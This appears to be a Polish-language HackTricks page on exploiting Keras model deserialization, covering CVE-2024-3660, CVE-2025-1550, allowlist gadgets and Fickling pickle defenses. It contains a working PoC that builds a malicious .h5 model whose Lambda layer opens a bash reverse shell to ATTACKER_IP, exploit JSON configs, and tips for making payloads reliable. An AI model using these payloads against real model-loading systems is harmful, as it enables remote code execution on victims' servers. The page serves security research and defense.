# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ta strona podsumowuje praktyczne techniki eksploatacji pipeline deserializacji modeli Keras, wyjaśnia wewnętrzną strukturę natywnego formatu .keras oraz powierzchnię ataku, i dostarcza zestaw narzędzi dla badaczy do znajdowania Model File Vulnerabilities (MFVs) i post-fix gadgets.

## Wnętrze formatu .keras

Plik .keras to archiwum ZIP zawierające co najmniej:
- metadata.json – informacje ogólne (np. wersja Keras)
- config.json – architekturę modelu (główna powierzchnia ataku)
- model.weights.h5 – wagi w formacie HDF5

Plik config.json steruje rekurencyjną deserializacją: Keras importuje moduły, rozwiązuje klasy/funkcje i rekonstruuje warstwy/obiekty z słowników kontrolowanych przez atakującego.

Przykładowy fragment dla obiektu warstwy Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserializacja wykonuje:
- Import modułów i rozwiązywanie symboli z kluczy module/class_name
- from_config(...) lub wywołanie konstruktora z kontrolowanymi przez atakującego kwargs
- Rekurencja w zagnieżdżonych obiektach (activations, initializers, constraints, itd.)

Historycznie to ujawniało trzy prymitywy atakującemu tworzącemu config.json:
- Kontrolę nad tym, które moduły są importowane
- Kontrolę nad tym, które klasy/funkcje są rozwiązywane
- Kontrolę nad kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Przyczyna:
- Lambda.from_config() używało python_utils.func_load(...), który base64-dekoduje i wywołuje marshal.loads() na bajtach dostarczonych przez atakującego; unmarshalowanie w Pythonie może wykonać kod.

Pomysł exploita (uproszczony payload w config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigacja:
- Keras wymusza safe_mode=True domyślnie. Zserializowane funkcje Pythona w Lambda są blokowane, chyba że użytkownik jawnie wyłączy to, ustawiając safe_mode=False.

Uwagi:
- Stare formaty (starsze zapisy HDF5) lub starsze bazy kodu mogą nie stosować nowoczesnych kontroli, więc ataki w stylu „downgrade” mogą nadal mieć zastosowanie, gdy ofiary używają starszych loaderów.

## CVE-2025-1550 – Dowolny import modułu w Keras ≤ 3.8

Przyczyna:
- _retrieve_class_or_fn używał nieograniczonego importlib.import_module() z ciągami modułów kontrolowanymi przez atakującego pochodzącymi z config.json.
- Wpływ: Dowolny import dowolnego zainstalowanego modułu (lub modułu podstawionego przez atakującego na sys.path). Kod wykonywany podczas importu uruchamia się, a następnie następuje konstrukcja obiektu z kwargs przekazanymi przez atakującego.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Ulepszenia bezpieczeństwa (Keras ≥ 3.9):
- Lista dozwolonych modułów: importy ograniczone do oficjalnych modułów ekosystemu: keras, keras_hub, keras_cv, keras_nlp
- Domyślny tryb bezpieczny: safe_mode=True blokuje ładowanie niebezpiecznych zserializowanych funkcji Lambda
- Podstawowe sprawdzanie typów: deserializowane obiekty muszą odpowiadać oczekiwanym typom

## Praktyczne wykorzystanie: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Wiele środowisk produkcyjnych nadal akceptuje przestarzałe pliki modeli TensorFlow-Keras HDF5 (.h5). Jeśli atakujący może przesłać model, który serwer później załaduje lub użyje do inferencji, warstwa Lambda może wykonać dowolny kod Python podczas ładowania/build/predict.

Minimalny PoC do stworzenia złośliwego .h5, który wykonuje reverse shell podczas deserializacji lub użycia:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Uwagi i wskazówki dotyczące niezawodności:
- Punkty wyzwalające: kod może uruchamiać się wielokrotnie (np. podczas layer build/first call, model.load_model, i predict/fit). Upewnij się, że payloady są idempotentne.
- Przypinanie wersji: dopasuj TF/Keras/Python ofiary, aby uniknąć niezgodności serializacji. Na przykład buduj artefakty przy użyciu Python 3.8 i TensorFlow 2.13.1, jeśli cel używa takich wersji.
- Szybkie odtworzenie środowiska:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Weryfikacja: nieszkodliwy payload taki jak os.system("ping -c 1 YOUR_IP") pomaga potwierdzić wykonanie (np. obserwując ICMP za pomocą tcpdump) przed przełączeniem na reverse shell.

## Powierzchnia gadżetów po poprawce wewnątrz allowlist

Nawet przy allowlistingu i safe mode, wśród dozwolonych Keras callables pozostaje szerokie pole ataku. Na przykład keras.utils.get_file może pobierać dowolne adresy URL do lokalizacji wybieranych przez użytkownika.

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Ważne ograniczenie:
- Lambda.call() poprzedza wejściowy tensor jako pierwszy argument pozycyjny podczas wywoływania docelowego callable. Wybrane gadgety muszą tolerować dodatkowy argument pozycyjny (lub akceptować *args/**kwargs). To ogranicza, które funkcje są wykonalne.

## Allowlista importów pickle dla modeli AI/ML (Fickling)

Wiele formatów modeli AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, starsze artefakty TensorFlow itp.) zawiera osadzone dane pickle Pythona. Atakujący rutynowo wykorzystują pickle GLOBAL imports i konstruktory obiektów do osiągnięcia RCE lub podmiany modelu podczas ładowania. Skanery oparte na czarnych listach często pomijają nowe lub nienotowane niebezpieczne importy.

Praktyczną obroną typu fail-closed jest podpięcie deserializera pickle Pythona i zezwalanie podczas unpicklingu jedynie na zweryfikowany zestaw nieszkodliwych importów związanych z ML. Trail of Bits’ Fickling implementuje tę politykę i dostarcza skompilowaną allowlistę importów ML zbudowaną na podstawie tysięcy publicznych Hugging Face pickles.

Model bezpieczeństwa dla „bezpiecznych” importów (intuicje wyciągnięte z badań i praktyki): importowane symbole używane przez pickle muszą jednocześnie:
- Nie wykonywać kodu ani powodować wykonania (brak skompilowanych/źródłowych obiektów kodu, uruchamiania powłoki, hooks itp.)
- Nie pobierać/ustawiać dowolnych atrybutów lub elementów
- Nie importować ani pozyskiwać referencji do innych obiektów Pythona z pickle VM
- Nie wywoływać żadnych wtórnych deserializerów (np. marshal, nested pickle), nawet pośrednio

Włącz protekcje Fickling jak najwcześniej podczas uruchamiania procesu, aby wszelkie ładowania pickle wykonywane przez frameworki (torch.load, joblib.load itp.) były sprawdzane:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Wskazówki operacyjne:
- Możesz tymczasowo wyłączyć/ponownie włączyć hooks tam, gdzie to konieczne:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Jeśli model uznany za bezpieczny jest zablokowany, rozszerz allowlist w swoim środowisku po przejrzeniu symboli:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling udostępnia też ogólne zabezpieczenia w czasie wykonywania, jeśli wolisz bardziej szczegółową kontrolę:
- fickling.always_check_safety() to wymuszenia sprawdzeń dla wszystkich pickle.load()
- with fickling.check_safety(): dla zakresowego egzekwowania
- fickling.load(path) / fickling.is_likely_safe(path) dla jednorazowych sprawdzeń

- Preferuj formaty modeli nie-pickle, gdy to możliwe (np. SafeTensors). Jeśli musisz akceptować pickle, uruchamiaj loadery z least privilege, bez network egress i egzekwuj allowlist.

Strategia allowlist-first demonstracyjnie blokuje typowe ścieżki exploitów ML opartych na pickle, zachowując jednocześnie wysoką kompatybilność. W benchmarku ToB Fickling oznaczył 100% syntetycznych złośliwych plików i przepuścił ~99% czystych plików z topowych repozytoriów Hugging Face.


## Zestaw narzędzi badacza

1) Systematic gadget discovery in allowed modules

Wypisz potencjalne callables w keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym, które mają skutki uboczne związane z file/network/process/env.

<details>
<summary>Wylicz potencjalnie niebezpieczne callables w allowlisted modułach Keras</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Testowanie bezpośredniej deserializacji (bez archiwum .keras)

Podawaj przygotowane dicts bezpośrednio do deserializatorów Keras, aby poznać akceptowane parametry i obserwować skutki uboczne.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Badanie międzywersyjne i formaty

Keras występuje w wielu repozytoriach/bardziej niż jednej erze z różnymi zabezpieczeniami i formatami:
- TensorFlow built-in Keras: tensorflow/python/keras (przestarzały, przeznaczony do usunięcia)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Powtarzaj testy w różnych repozytoriach kodu i formatach (.keras vs przestarzały HDF5), aby wykryć regresje lub brakujące zabezpieczenia.

## Referencje

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
